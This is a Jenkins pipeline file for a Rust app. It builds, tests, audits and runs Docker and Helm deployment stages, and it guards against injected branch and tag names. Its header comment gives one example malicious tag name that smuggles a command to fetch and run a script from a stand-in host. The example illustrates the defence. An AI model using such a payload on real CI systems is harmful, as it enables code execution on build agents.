// =============================================================================
// Armature Application - Jenkins Multibranch Pipeline
// =============================================================================
// Full CI/CD pipeline with environment-specific deployments
//
// Security notes:
// - Branch and tag names are chosen by whoever can push to the repository
//   (or open a PR), so they are untrusted input. They are validated against
//   a strict pattern and only ever reach the shell as environment variables
//   (withEnv) inside single-quoted sh '...' steps. Never interpolate them
//   into a Groovy string ("${...}") that becomes a shell command: a tag like
//   v1$(curl evil|sh) would run on the agent.
// - `cargo audit` failures fail the build.
// =============================================================================

// Fixed names; not derived from the (attacker-influenced) job/branch name.
def APP_NAME = 'armature-app'
def DOCKER_REGISTRY = 'your-registry.com'

// Allowed shapes for refs that end up in image tags / release names.
def SAFE_BRANCH = ~/^[A-Za-z0-9][A-Za-z0-9._\/-]{0,99}$/
def SAFE_TAG = ~/^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$/

pipeline {
    agent any

    environment {
        RUST_BACKTRACE = '1'
        CARGO_TERM_COLOR = 'always'
        APP_NAME = "${APP_NAME}"
        DOCKER_REGISTRY = "${DOCKER_REGISTRY}"
        // Per-job cargo cache: never shared with other jobs/branches, so one
        // pipeline cannot plant artifacts that another one then executes.
        CARGO_HOME = "${env.WORKSPACE}/.cargo-home"
        CARGO_TARGET_DIR = "${env.WORKSPACE}/target"
    }

    options {
        timeout(time: 60, unit: 'MINUTES')
        buildDiscarder(logRotator(numToKeepStr: '20'))
        disableConcurrentBuilds()
        timestamps()
    }

    stages {
        // =====================================================================
        // CHECKOUT & SETUP
        // =====================================================================
        stage('Checkout') {
            steps {
                checkout scm
                script {
                    if (env.TAG_NAME && !(env.TAG_NAME ==~ SAFE_TAG)) {
                        error("Refusing to build: tag name does not match ${SAFE_TAG}")
                    }
                    if (env.BRANCH_NAME && !(env.BRANCH_NAME ==~ SAFE_BRANCH)) {
                        error("Refusing to build: branch name does not match ${SAFE_BRANCH}")
                    }
                    env.GIT_COMMIT_SHORT = sh(script: 'git rev-parse --short HEAD', returnStdout: true).trim()
                    // Docker tags allow [A-Za-z0-9_.-]; map anything else to '-'.
                    env.GIT_BRANCH_CLEAN = (env.BRANCH_NAME ?: 'detached').replaceAll(/[^A-Za-z0-9_.-]/, '-')
                }
            }
        }

        // =====================================================================
        // BUILD
        // =====================================================================
        stage('Build') {
            steps {
                sh '''
                    echo "Building ${APP_NAME}..."
                    cargo build --release --locked
                '''
            }
        }

        // =====================================================================
        // TEST
        // =====================================================================
        stage('Test') {
            parallel {
                stage('Unit Tests') {
                    steps {
                        sh 'cargo test --lib --release --locked -- --test-threads=4'
                    }
                    post {
                        always {
                            junit allowEmptyResults: true, testResults: 'target/test-results/*.xml'
                        }
                    }
                }
                stage('Integration Tests') {
                    when {
                        anyOf {
                            branch 'main'
                            branch 'develop'
                            changeRequest()
                        }
                    }
                    steps {
                        sh 'cargo test --test "*" --release --locked'
                    }
                }
            }
        }

        // =====================================================================
        // CODE QUALITY
        // =====================================================================
        stage('Quality') {
            parallel {
                stage('Format') {
                    steps {
                        sh 'cargo fmt -- --check'
                    }
                }
                stage('Clippy') {
                    steps {
                        sh 'cargo clippy --all-targets --release --locked -- -D warnings'
                    }
                }
                stage('Security') {
                    steps {
                        // Blocking: a known-vulnerable dependency fails the
                        // build. Record a justified exception in
                        // .cargo/audit.toml rather than ignoring the result.
                        sh '''
                            command -v cargo-audit >/dev/null 2>&1 \
                                || cargo install cargo-audit --version 0.22.2 --locked
                            cargo audit
                        '''
                    }
                }
            }
        }

        // =====================================================================
        // BUILD DOCKER IMAGE
        // =====================================================================
        stage('Docker') {
            when {
                anyOf {
                    branch 'main'
                    branch 'develop'
                    buildingTag()
                }
            }
            steps {
                script {
                    env.DOCKER_TAG = env.TAG_NAME ?: "${env.GIT_BRANCH_CLEAN}-${env.GIT_COMMIT_SHORT}"
                }
                withEnv(["IMAGE_TAG=${env.DOCKER_TAG}", "BRANCH_TAG=${env.GIT_BRANCH_CLEAN}-latest"]) {
                    sh '''
                        echo "Building Docker image..."
                        docker build -t "${DOCKER_REGISTRY}/${APP_NAME}:${IMAGE_TAG}" .
                        docker tag "${DOCKER_REGISTRY}/${APP_NAME}:${IMAGE_TAG}" "${DOCKER_REGISTRY}/${APP_NAME}:${BRANCH_TAG}"
                    '''
                }
            }
        }

        // =====================================================================
        // DEPLOY TO DEVELOPMENT
        // =====================================================================
        stage('Deploy Dev') {
            when {
                branch 'develop'
            }
            steps {
                echo 'Deploying to development...'
                withEnv(["IMAGE_TAG=${env.DOCKER_TAG}"]) {
                    sh '''
                        # Example: Helm deployment (the chart requires an image
                        # and a JWT secret; reference a pre-created Secret)
                        # helm upgrade --install "${APP_NAME}-dev" ./templates/helm/armature \
                        #     --namespace development \
                        #     --set image.repository="${DOCKER_REGISTRY}/${APP_NAME}" \
                        #     --set image.tag="${IMAGE_TAG}" \
                        #     --set secrets.existingSecret="${APP_NAME}-secrets"

                        echo "Deployed ${APP_NAME}:${IMAGE_TAG} to development"
                    '''
                }
            }
        }

        // =====================================================================
        // DEPLOY TO STAGING
        // =====================================================================
        stage('Deploy Staging') {
            when {
                branch 'main'
            }
            steps {
                echo 'Deploying to staging...'
                withEnv(["IMAGE_TAG=${env.DOCKER_TAG}"]) {
                    sh '''
                        # Example: Helm deployment
                        # helm upgrade --install "${APP_NAME}-staging" ./templates/helm/armature \
                        #     --namespace staging \
                        #     --set image.repository="${DOCKER_REGISTRY}/${APP_NAME}" \
                        #     --set image.tag="${IMAGE_TAG}" \
                        #     --set secrets.existingSecret="${APP_NAME}-secrets"

                        echo "Deployed ${APP_NAME}:${IMAGE_TAG} to staging"
                    '''
                }
            }
        }

        // =====================================================================
        // DEPLOY TO PRODUCTION (manual approval)
        // =====================================================================
        stage('Deploy Production') {
            when {
                buildingTag()
            }
            steps {
                timeout(time: 30, unit: 'MINUTES') {
                    input message: 'Deploy to production?', ok: 'Deploy'
                }
                echo 'Deploying to production...'
                withEnv(["RELEASE_TAG=${env.TAG_NAME}"]) {
                    sh '''
                        # Example: Helm deployment
                        # helm upgrade --install "${APP_NAME}" ./templates/helm/armature \
                        #     --namespace production \
                        #     --set image.repository="${DOCKER_REGISTRY}/${APP_NAME}" \
                        #     --set image.tag="${RELEASE_TAG}" \
                        #     --set secrets.existingSecret="${APP_NAME}-secrets" \
                        #     --set replicaCount=3

                        echo "Deployed ${APP_NAME}:${RELEASE_TAG} to production"
                    '''
                }
            }
        }
    }

    post {
        always {
            cleanWs()
        }
        success {
            echo "Pipeline succeeded for ${APP_NAME}"
            // slackSend(color: 'good', message: "${APP_NAME} build #${BUILD_NUMBER} succeeded")
        }
        failure {
            echo "Pipeline failed for ${APP_NAME}"
            // slackSend(color: 'danger', message: "${APP_NAME} build #${BUILD_NUMBER} failed")
        }
    }
}
